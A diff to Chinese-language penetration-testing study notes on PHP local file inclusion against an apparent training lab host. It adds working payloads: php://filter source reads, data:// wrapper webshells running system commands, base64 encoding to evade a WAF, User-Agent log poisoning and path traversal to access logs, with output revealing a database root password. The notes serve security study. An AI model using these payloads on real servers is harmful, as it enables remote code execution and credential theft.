@@ -211,10 +211,45 @@ fetch(`/getflag\)
     
 
 ### LFI
-只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
-1. 寫入 webshell 之類的達到 RCE
-2. 利用 PHP 的偽協議達到讀特殊檔案的需求
-   * `http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>`
+* 前提: 在 PHP 中需要特別啟用 `allow_url_include`
+* 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
+    1. 寫入 webshell 之類的達到 RCE
+    2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content
+
+    ```bash
+    $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
+    php://filter/convert.base64-encode/resource=<file path> # 把 LFI 指定的檔案轉換成 base64 encode ，用絕對/相對路徑讀資料都可以
+    php://filter/resource=<file path> # 測試有無 LFI 弱點
+    data://text/plain,<?php%20echo%20system('ls');?> # 嘗試將一個以 URL 編碼的小型 PHP 片段嵌入網頁應用程式的程式碼
+    data://text/plain;base64,<base64 encode str>&cmd=ls
+
+    # 如果 WAF 會擋前面提到的 payload ，那就可以做簡單的編碼，讓後端還是可以實際執行
+    $ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+    PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+    ```
+
+    以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只顯示最基本的資訊，但透過 PHP wrapper 可以讀到更多，包含後端帳密
+    ```bash
+    kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
+    ...
+    The admin page is currently under maintenance.
+    kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+    ...
+    PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+    dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+    ...
+    kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
+    ...
+    <?php
+    $servername = "localhost";
+    $username = "root";
+    $password = "M00nK4keCard!2#";
+
+    // Create connection
+    $conn = new mysqli($servername, $username, $password);
+    ...
+    ```
 
 #### 利用 LFI 拿 reverse shell
 * PHP filter + base64（確認能讀檔）
@@ -223,11 +258,15 @@ fetch(`/getflag\)
     $ curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=index"
 
     # 然後包含 access log：
-    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=id"
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log" # linux 限定
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=C:/xampp/apache/logs/access.log" # windows 限定
     ```
 * Log poisoning（較常見於 OSCP）
     ```bash
     $ curl -A "<?php system(\$_GET['cmd']); ?>" http://mountaindesserts.local/meteor/index.php
+
+    # 然後包含 access log：
+    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami"
     ```
 * php://input 或 data:// wrapper
     ```bash
